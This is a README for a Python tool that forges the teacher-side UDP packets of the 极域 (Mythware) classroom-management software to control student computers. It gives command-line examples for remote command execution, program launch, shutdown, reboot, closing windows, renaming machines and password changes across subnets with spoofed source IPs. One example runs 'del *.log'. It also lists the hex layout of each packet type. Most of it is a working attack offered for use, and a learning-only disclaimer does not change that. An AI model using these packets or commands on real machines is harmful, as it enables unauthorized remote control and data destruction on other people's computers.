# Jiyu_replay_attack

[![GitHub release](https://img.shields.io/github/release/weilycoder/Jiyu_replay_attack.svg)](https://github.com/weilycoder/Jiyu_replay_attack/releases/latest)

利用极域电子教室的 UDP 协议伪装教师端，向学生机发送控制指令。

对这方面技术的了解来自 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack/)。

本项目仅供学习和研究使用，请勿用于任何非法用途。请在使用前确保你未违反所在地区的法律法规，并且已获得相关设备所有者的明确许可。

## Environment

- Python >= 3.8，< 4
- `scapy`（数据包构造与发送）
- `psutil`（本地 UDP 端口检测）
- 需要安装 Npcap 或 WinPcap（用于 scapy 发送原始套接字）

项目针对极域电子教室 2016 版开发，不保证所有操作对其他版本有效。

如果你希望我针对其他版本开发，请为我提供该版本有效的教师端和学生端下载程序。

## Installation

本项目使用 Poetry 进行依赖管理： 

```
pip install poetry
poetry install
```

或直接使用 pip：

```
pip install scapy psutil
```

## Usage

```bash
python -m Jiyu_replay_attack <command> [options]
```

项目采用子命令结构，包含 `udp-attack` 和 `detect` 两个子命令。

### `udp-attack` — 攻击指令

执行各种攻击操作，需要指定目标 IP 和攻击动作。

```
python -m Jiyu_replay_attack udp-attack [options]
```

**网络配置：**

| 参数 | 说明 |
|------|------|
| `-f, --teacher-ip <ip>` | 教师端 IP 地址（伪造源 IP） |
| `-fp, --teacher-port <port>` | 教师端端口（默认随机） |
| `-t, --target <ip> [<ip> ...]` | 目标 IP 地址（支持 CIDR、范围、多目标） |
| `-tp, --target-port <port>` | 目标端口（默认 4705，即极域 2016，极域 2020 为 4988） |
| `-i, --ip-id <ip_id>` | IP 标识（默认随机） |

**攻击动作（互斥，每次选择一个）：**

| 参数 | 说明 |
|------|------|
| `-m, --message <msg>` | 向目标发送消息 |
| `-w, --website <url>` | 强制打开指定网页 |
| `-c, --command <command>` | 执行命令（`cmd /D /C <command>`，仅 Windows） |
| `-e, --execute <program> [<args> ...]` | 执行程序（支持 `--minimize-execute`、`--maximize-execute`） |
| `-s, --shutdown [<timeout> [<message> ...]]` | 关机（可设定时和消息） |
| `-r, --reboot [<timeout> [<message> ...]]` | 重启（可设定时和消息） |
| `-cw, --close-windows [<timeout> [<message> ...]]` | 关闭所有窗口 |
| `-ctw, --close-top-window` | 关闭顶层窗口 |
| `-n, --rename <name> <name_id>` | 重命名目标机器 |
| `--setting [<setting-args>]` | 修改教师端设置（网络/音频/密码/安全等） |
| `--hex <hex_data>` | 发送原始十六进制数据 |
| `--pkg <custom_data> [<args> ...]` | 自定义数据包（支持格式字符串或文件） |

使用 `--setting` 时可用的子选项：

```
--network                               启用网络配置
--transmission_reliability              传输可靠性：low / medium（默认）/ high
--offline-lag-time-detection            离线滞后检测时间（秒，默认 10）
--audio                                 启用音频配置
--playback-mute                         静音播放
--recording-mute                        静音录制
--playback-volume <vol>                 播放音量（默认 80）
--recording-volume <vol>                录制音量（默认 80）
--password                              启用密码
--password-value <pwd>                  设置密码
--preventing-process-termination        防进程终止：disable / enable / auto（默认）
--lock-screen-when-maliciously-offline  恶意离线锁屏：disable / enable / auto（默认）
--hide-the-setup-name-button            隐藏设置名称按钮：disable / enable / auto（默认）
```

### `detect` — 本地端口探测

检测本机 UDP 监听端口，默认过滤极域学生端进程：

```bash
python -m Jiyu_replay_attack detect [<keyword> ...]
```

| 参数 | 说明 |
|------|------|
| `<keyword>` | 进程名关键词过滤（默认：`studentmain`） |
| `--detect-format <format>` | 自定义输出格式，支持 `{ip}` `{port}` `{pid}` `{name}` |

### 示例

```bash
# 向目标发送消息
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 -m "Hello World"

# 强制打开网页
python -m Jiyu_replay_attack udp-attack -t 192.168.106.104 -w https://www.github.com

# CIDR 范围 + 伪造教师 IP + 执行命令
python -m Jiyu_replay_attack udp-attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000

# 最大化执行程序
python -m Jiyu_replay_attack udp-attack -t 224.50.50.42 --maximize-execute notepad.exe

# 定时关机并显示消息
python -m Jiyu_replay_attack udp-attack -t 224.50.50.42 -s 60 "系统即将关机。"

# IP 范围 + 重启
python -m Jiyu_replay_attack udp-attack -t 192.168.106.105-120 -r 30 "正在重启。"

# 关闭所有窗口 / 关闭顶层窗口
python -m Jiyu_replay_attack udp-attack -t 192.168.106.255 -cw
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 -ctw

# 重命名目标
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 -n hacker 1000

# 发送原始十六进制数据
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --hex 444d4f43000001002a020000

# 自定义数据包（格式字符串）
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello

# 从文件读取自定义包格式
python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg test.txt 1024 hello

# 修改教师端设置
python -m Jiyu_replay_attack udp-attack -t 127.0.0.1 --setting

# 检测本地极域 UDP 端口
python -m Jiyu_replay_attack detect

# 自定义格式输出
python -m Jiyu_replay_attack detect --detect-format "{ip}:{port}"
```

### IP 地址指定

对于目标 IP 的指定，支持多种格式：

- **具体 IP**：`192.168.3.103`
- **IP 范围**：`192.168.3.100-150`（最多 65536 个不同 IP）
- **CIDR 子网**：`192.168.3.0/24`（自动转换为广播地址 `192.168.3.255`）
- **组播地址**：`224.50.50.42`（极域默认组播）
- **带端口**：`192.168.233.100:1234`（在目标 IP 中直接指定端口，覆盖 `-tp`）

### 端口说明

- 极域 2016 版默认端口 `4705`（脚本默认）
- 极域 2020 版默认端口 `4988`
- 可使用 `-tp` 全局指定目标端口
- 也可以在 `-t` 中为每个 IP 单独指定端口（如 `-t 192.168.233.100:1234`）
- 教师端端口只能使用 `-fp` 指定

### `--setting` 详细说明

由于 `--setting` 的配置项较多，程序将其交给独立的参数解析器处理。使用时需将设置选项作为引号包裹的字符串传入，例如：

```bash
python -m Jiyu_replay_attack udp-attack -t 192.168.233.0/24 --setting="--network --preventing-process-termination enable"
python -m Jiyu_replay_attack udp-attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
```

### `--pkg` 详细说明

`--pkg` 用于发送格式化的数据包，可以指定参数，首个参数作为格式化字符串，其余参数被应用于字符串的格式化。格式化字符串的内容为 16 进制编码的数据包，因此需要保证应用格式化后字符串为合法的 16 进制编码串。

处理时使用了自定义的类型包装参数，定义了 `HexInt` 和 `HexStr` 两个类型，输入的参数均作为 `HexStr`；此外，还定义了 `rand16` 作为可用变量。

目前支持的属性包括（以位置 `0` 为例）：

- `HexInt`
  + `{0}`：直接输出十进制数字，无前导零。
  + `{0.big_<size>}`：将数转为 `<size>` 位字节，大端序编码；
  + `{0.little_<size>}`：将数转为 `<size>` 位字节，小端序编码；
  + `{0.add_<value>}`：将数加 `<value>`；
  + `{0.sub_<value>}`：将数减 `<value>`，请注意 `HexInt` 不支持负数；
  + `{0.mul_<value>}`：将数乘 `<value>`；
  + `{0.div_<value>}`：将数整除 `<value>`；
  + `{0.mod_<value>}`：将数对 `<value>` 取模。
- `HexStr`
  + `{0}`：直接输出字符串本身，因此此时应保证字符串为 16 进制码；
  + `{0.len}`：返回字符串的长度；
  + `{0.hex}`：将字符串转化为 `utf-16le` 编码；
  + `{0.int}`：将字符串解释为数；
  + `{0.int_<base>}`：将字符串解释为 `<base>` 进制数；
  + `{0.size_<size>}`：将字符串转化为 `utf-16le` 编码，并填充 `\x00` 到 `<size>` 位，若超过 `<size>` 位则报错。
- `rand16`
  + `{rand16}`：生成一个随机字节；
  + `{rand16.size_<size>}`：生成 `<size>` 个随机字节。

注意，`rand16` 的返回值为 `str`，而非 `HexStr`。

## Import as Module

你也可以在 Python 代码中导入使用：

```python
from Jiyu_replay_attack import send_packet, broadcast_packet, pkg_message, pkg_shutdown

payload = pkg_message("Hello World")
send_packet("192.168.1.1", None, "192.168.1.100", 4705, payload)
```

## Jiyu API

记录抓包得到的极域 udp 包格式。

不记录包头信息，只记录 Data 格式。

子标题名是我自己起的。

### Message

用于教师端向学生端发送信息。

Data 区长 $954$。

| 长度  |                            内容                            |
| :---: | :--------------------------------------------------------: |
| $12$  |                 `444d4f43000001009e030000`                 |
| $16$  |                        随机二进制串                        |
| $28$  | `204e0000c0a86c019103000091030000000800000000000005000000` |
| $800$ |               信息内容，使用 `utf-16le` 编码               |
| $98$  |                  全 $0$ 段，可能是保留区                   |

### Rename

Data 区长 $96$。

| 长度 |                            内容                            |
| :--: | :--------------------------------------------------------: |
| $28$ | `47434d4e000001004400000066b1e4923f9a364a943a3da3bd976041` |
| $4$  |              *ID*，需要大于上一次提供的 *ID*               |
| $64$ |        新名称，以 `\x00` 结尾，使用 `utf-16le` 编码        |

由于新名称的结尾以 `\x00` 标记，因此在结尾后可以加入其他数据，不影响识别，也没有副作用。

注意，结尾标记 `\x00` 经 `utf-16le` 编码后变为 `\x00\x00`。

如果提供一个较大的 *ID*，会使教师端的重命名消息不在学生端提示。

### Execute

用于教师端在学生端远程执行命令。

Data 区长 $906$。

| 长度  |                             内容                             |
| :---: | :----------------------------------------------------------: |
| $12$  |                  `444d4f43000001006e030000`                  |
| $16$  |                         随机二进制串                         |
| $32$  | `204e0000c0a8e901610300006103000000020000000000000f00000001000000` |
| $512$ |             可执行程序位置，使用 `utf-16le` 编码             |
| $254$ |                执行参数，使用 `utf-16le` 编码                |
| $66$  |                          全 $0$ 段                           |
|  $1$  |       正常启动 `00`；最小化启动 `01`；最大化启动 `02`        |
| $13$  |                 `00000001000000000000000000`                 |

另外，脚本的 `-c` 功能实际上是使用参数 `f'/D /C "{args.command}"'` 打开程序 `CMD.exe`，这里参数使用 Python 的字符串格式化语法表示。

### Website

用于教师端在学生端远程打开网站。

Data 区变长，至少 $64$ 个字节。

|      长度       |                内容                |
| :-------------: | :--------------------------------: |
|       $8$       |         `444d4f4300000100`         |
|       $4$       |   $\mathrm{size}+36$，小端序编码   |
|      $16$       |            随机二进制串            |
|       $8$       |         `204e0000c0a8e901`         |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|      $16$       | `00020000000000001800000000000000` |
| $\mathrm{size}$ |     网址，使用 `utf-16le` 编码     |
|       $4$       |             全 $0$ 段              |

### Reboot / Shutdown

用于重启/关闭学生机。

Data 区长 $582$。

| 长度  |                        内容                        |
| :---: | :------------------------------------------------: |
| $12$  |             `444d4f43000001002a020000`             |
| $16$  |                    随机二进制串                    |
| $24$  | `204e0000c0a8e9011d0200001d0200000002000000000000` |
|  $2$  |              重启 `1300`；关闭 `1400`              |
|  $2$  |          立即执行 `0010`；应用超时 `0000`          |
|  $4$  |                超时时间，小端序编码                |
|  $8$  |                 `0100000000000000`                 |
| $256$ |             提示信息，`utf-16le` 编码              |
| $258$ |                     全 $0$ 段                      |

### Close-Windows

用于关闭学生端所有窗口，与 Reboot / Shutdown 高度相似。

Data 区长 $582$。

| 长度  |                        内容                        |
| :---: | :------------------------------------------------: |
| $12$  |             `444d4f43000001002a020000`             |
| $16$  |                    随机二进制串                    |
| $24$  | `204e0000c0a8e9011d0200001d0200000002000000000000` |
|  $2$  |                       `0200`                       |
|  $2$  |          立即执行 `0010`；应用超时 `0000`          |
|  $4$  |                超时时间，小端序编码                |
|  $8$  |                 `0100000000000000`                 |
| $256$ |             提示信息，`utf-16le` 编码              |
| $258$ |                     全 $0$ 段                      |

### Close-Top-Window

用于关闭学生端顶层窗口。

Data 区长 $906$。

| 长度  |                            内容                            |
| :---: | :--------------------------------------------------------: |
| $12$  |                 `444d4f43000001006e030000`                 |
| $16$  |                        随机二进制串                        |
| $28$  | `204e0000c0a8019b610300006103000000020000000000000e000000` |
| $850$ |                    未知含义，可以全 $0$                    |

### Setting

用于教师端对学生端的一些设置。

Data 区长 $177$。

| 长度 |                             内容                             |
| :--: | :----------------------------------------------------------: |
| $12$ |                  `444d4f430000010095000000`                  |
| $16$ |                         随机二进制串                         |
| $32$ | `204e0000c0a8e90188000000880000000040000000000000060000007b000000` |
| $4$  |         是否进行网络设置（`01000000` / `00000000`）          |
| $4$  |   传输可靠性：低 `02000000`；中 `01000000`；高 `00000000`    |
| $4$  |             脱机滞后时间检测，小端序编码，单位秒             |
| $4$  |                       是否进行音频设置                       |
| $4$  |                     是否开启播放音量静音                     |
| $4$  |                     是否开启录制音量静音                     |
| $4$  |               录制音量，小端序编码，范围 0-100                |
| $4$  |                           播放音量                           |
| $4$  |                    是否进行学生机密码设置                    |
| $66$ |          密码，以 `\x00` 结尾，使用 `utf-16le` 编码          |
| $4$  | 阻止学生终止进程：禁用 `00000000`；启用 `01000000`；不变 `02000000` |
| $4$  | 当学生恶意离线时锁定屏幕：禁用 `00000000`；启用 `01000000`；不变 `02000000` |
| $4$  | 隐藏设置名称按钮：禁用 `00000000`；启用 `01000000`；不变 `02000000` |
| $2$  |                            `0000`                            |
| $1$  |                    未知含义，可以填 `00`                     |

## License

本项目使用 MIT 协议。

如果你只是单纯使用本项目的代码，通常无需特别关注协议内容；但如果你希望修改、分发或以其他方式再利用本项目代码（如再授权、再发布等），请务必保留原有的版权声明。详细条款请参见项目中的 [LICENSE](./LICENSE) 文件。

另外，README 文件适用 [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/) 许可证。
